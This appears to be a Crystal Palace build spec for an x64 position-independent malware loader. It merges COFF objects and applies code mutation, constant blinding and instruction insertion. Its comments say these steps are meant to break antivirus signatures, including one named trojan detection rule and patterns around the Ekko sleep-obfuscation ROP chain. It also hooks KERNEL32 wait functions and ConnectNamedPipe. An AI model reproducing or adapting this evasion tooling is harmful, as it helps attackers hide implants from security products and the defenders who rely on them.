x64:

  load "../../build/pico.x64.o"                                         # read the pico COFF
    make object +optimize +disco +mutate +regdance +blockparty
  
  load "../../build/hooks.x64.o"                                        # read the hooks COFF
    merge                             

  load "../../build/cfg.x64.o"                                          # read the cfg COFF
    merge

  mergelib "../../crystal_palace/libtcg.x64.zip"

  # ── Constant Blinding: controlled magic pool for deterministic ised targeting ──
  magic "0xBAADF00D, 0x8BADF00D, 0xFEEDFACE, 0x0DEFACED"

  # ── ised: surgically break signature-attractive patterns in the PICO ──
  # Break signatures around EkkoObf's ROP chain setup (NtContinue, SystemFunction032 calls)
  pack $NOP "b" 0x90
  ised insert "CALL rel32" $NOP +safe
  # Also cover indirect CALL r/m64 (call rax, call rbx etc. from DFR dispatch)
  ised insert "CALL r/m64" $NOP +safe

  # Split blocks around hook dispatch logic to scatter across memory with +blockparty
  ised insert "MOV" "CMP" $NULL +split +last +after

  # ── Break Windows_Trojan_CristalLoaders_652f19ab ($b1 / $b2) ──
  # Same DFR-trampoline mitigation as loader.spec — pico.spec also runs +disco,
  # so the 14-byte push prologue and 12-byte pop+call epilogue appear here too.
  ised insert "PUSH r64" "SUB r/m64, imm8" $NOP +before
  ised insert "POP r64"  "CALL r/m64"      $NOP +before

  # ── Yara rule generation for PICO ──
  rule "" 10 3 10-16

  exportfunc "setup_hooks" "__tag_setup_hooks"                          # export the hooks setup function for the loader to call
  exportfunc "set_image_info" "__tag_set_image_info"                    # export image info setter for Ekko obfuscation

  addhook "KERNEL32$WaitForSingleObjectEx" "_WaitForSingleObjectEx"     
  addhook "KERNEL32$WaitForSingleObject" "_WaitForSingleObject"         
  addhook "KERNEL32$WaitForMultipleObjects" "_WaitForMultipleObjects"                   
  addhook "KERNEL32$ConnectNamedPipe" "_ConnectNamedPipe" 
  
  export